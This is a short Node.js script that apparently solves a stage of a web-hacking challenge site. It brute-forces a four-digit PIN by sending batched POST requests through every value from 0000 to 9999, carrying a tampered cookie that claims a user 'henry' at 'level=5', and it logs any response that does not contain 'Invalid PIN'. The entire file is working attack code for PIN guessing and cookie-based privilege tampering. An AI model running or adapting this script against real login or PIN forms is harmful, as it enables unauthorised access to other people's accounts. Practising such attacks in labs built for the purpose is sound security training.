const express = require("express");

const app = express();

const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

var number = 0;

const fetchAllPins = async() => {
  for (var j = 0; j <= 25; j++) {
    var batchPromises = [];

    for (var i = j * 400; i <= j * 400 + 400; i++) {
      batchPromises.push(fetchPin(i));
    }

    await Promise.all(batchPromises);
    console.log("Finished batch: " + j);
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
}

const fetchPin = (pin) => {
  var formattedPin = ("000" + pin).slice(-4);
  return fetch("https://webhacker.apphb.com/4251c282-01f9-4cbb-8d01-16eb3e800eee/stage4", {
    "headers": {
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "accept-language": "en-GB,en;q=0.9",
      "cache-control": "no-cache",
      "content-type": "application/x-www-form-urlencoded",
      "pragma": "no-cache",
      "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"macOS\"",
      "sec-fetch-dest": "document",
      "sec-fetch-mode": "navigate",
      "sec-fetch-site": "same-origin",
      "sec-fetch-user": "?1",
      "sec-gpc": "1",
      "upgrade-insecure-requests": "1",
      "cookie": "auth=username=henry&level=5",
      "Referer": "https://webhacker.apphb.com/4251c282-01f9-4cbb-8d01-16eb3e800eee/stage4",
      "Referrer-Policy": "strict-origin-when-cross-origin"
    },
    "body": "Pin=" + formattedPin,
    "method": "POST"
  })
    .then(response => response.text())
    .then(data => {
      if (!data.includes("Invalid PIN")) {
        console.log("FOUND!!!!!!!!: " + formattedPin);
      // } else {
      //   console.log("Trying: " + formattedPin + " | Number: " + number++);
      }
    })
    .catch((error) => {
      console.log("Error: " + formattedPin);
    });;
}

fetchAllPins();

module.exports = app;